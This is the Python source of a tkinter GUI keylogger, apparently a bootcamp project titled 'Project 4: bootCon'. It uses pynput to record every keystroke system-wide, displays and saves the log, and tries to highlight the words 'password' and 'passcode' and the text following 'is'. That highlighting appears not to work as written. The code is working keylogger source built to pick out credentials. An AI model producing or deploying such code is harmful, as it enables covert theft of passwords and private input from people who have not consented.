import tkinter as tk
from pynput import keyboard
import threading
from tkinter import filedialog

class GUIApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Jalen | Keylogger, Project 4: bootCon")

        # Set dark mode colors
        self.root.configure(bg='black')
        self.text_widget = tk.Text(self.root, state='disabled', bg='black', fg='white')
        self.text_widget.pack()

        self.start_button = tk.Button(self.root, text="Start Key Logger", command=self.start_thread, bg='black', fg='white')
        self.start_button.pack()

        self.stop_button = tk.Button(self.root, text="Stop Key Logger", command=self.stop_thread, state='disabled', bg='black', fg='white')
        self.stop_button.pack()

        self.clear_button = tk.Button(self.root, text="Clear", command=self.clear_text, bg='black', fg='white')
        self.clear_button.pack()

        self.save_button = tk.Button(self.root, text="Save as TXT", command=self.save_as_txt, bg='black', fg='white')
        self.save_button.pack()

        self.running = False
        self.key_buffer = []  # To keep track of typed keys

    def start_thread(self):
        self.running = True
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')

        self.thread = threading.Thread(target=self.start_keylogger)
        self.thread.start()

    def stop_thread(self):
        self.running = False
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')

    def start_keylogger(self):
        def on_key_pressed(key):
            if not self.running:
                return

            try:
                char = key.char
                self.key_buffer.append(char)

                self.update_text_widget()

            except AttributeError:
                if key == keyboard.Key.space:
                    char = ' '
                elif key == keyboard.Key.backspace:
                    char = '[BS]'
                else:
                    char = str(key)

                self.key_buffer.append(char)

                self.update_text_widget()

        with keyboard.Listener(on_press=on_key_pressed) as listener:
            listener.join()

    def update_text_widget(self):
        text = ''.join(self.key_buffer)
        
        # Clear all existing tags
        self.text_widget.tag_delete("red_tag")
        self.text_widget.tag_delete("green_tag")

        # Highlight "password" and "passcode" in red
        self.highlight_text("password", "red_tag")
        self.highlight_text("passcode", "red_tag")

        # Highlight text after "is" in green
        self.highlight_after_text("is", "green_tag")

        self.text_widget.config(state='normal')
        self.text_widget.delete('1.0', 'end')  # Clear existing text
        self.text_widget.insert('end', text)
        self.text_widget.config(state='disabled')
        self.text_widget.see('end')  # Scroll to the end

    def highlight_text(self, text, tag):
        start_index = "1.0"
        while True:
            start_index = self.text_widget.search(text, start_index, stopindex=tk.END)
            if not start_index:
                break
            end_index = f"{start_index}+{len(text)}c"
            self.text_widget.tag_add(tag, start_index, end_index)
            start_index = end_index

    def highlight_after_text(self, text, tag):
        start_index = "1.0"
        while True:
            start_index = self.text_widget.search(text, start_index, stopindex=tk.END)
            if not start_index:
                break
            start_index = self.text_widget.index(f"{start_index}+{len(text)}c")
            end_index = self.text_widget.index(tk.END)
            self.text_widget.tag_add(tag, start_index, end_index)
            break

    def clear_text(self):
        self.key_buffer = []
        self.update_text_widget()

    def save_as_txt(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'w') as file:
                file.write(''.join(self.key_buffer))

root = tk.Tk()
app = GUIApp(root)
root.mainloop()